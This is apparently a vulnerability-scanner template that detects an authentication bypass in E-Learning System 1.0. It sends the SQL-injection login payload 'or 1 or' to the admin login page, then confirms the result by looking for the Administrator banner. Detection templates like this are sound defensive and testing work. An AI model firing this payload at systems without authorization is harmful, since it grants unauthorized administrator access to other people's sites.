id: E-Learning-System1.0-Authentication-Bypass-RCE

info:
  name: E-Learning System 1.0 - Authentication Bypass
  author: daffainfo
  severity: critical
  description: E-Learning System 1.0-通过SQL注入+远程代码执行绕过身份验证
  reference:
    - https://www.exploit-db.com/exploits/49434

set:
  hosturl: request.url
rules:
  r0:
    request:
      method: POST
      path: /caiwl/admin/login.php
      follow_redirects: true
      headers:
        Referer: "{{hosturl}}/caiwl/admin/login.php"
        Origin: "{{hosturl}}"
        Cookie: PHPSESSID=p4s256t6kaorni5i3ifelrjnp7
      body: |
        user_email=%27or+1+or%27&user_pass=admin&btnLogin=
    expression: response.status == 200 && response.headers["content-type"].contains("text/html")
  r1:
    request:
      method: GET
      path: /caiwl/admin/index.php
      headers:
        Referer: "{{hosturl}}/caiwl/admin/login.php"
        Cookie: PHPSESSID=p4s256t6kaorni5i3ifelrjnp7
    expression: response.status == 200 && response.body.bcontains(b'COMPUTER AIDED INSTRUCTION IN WORLD LITERATURE') && response.body.bcontains(b'You login as Administrator.') && response.headers["content-type"].contains("text/html")
expression: r0() && r1()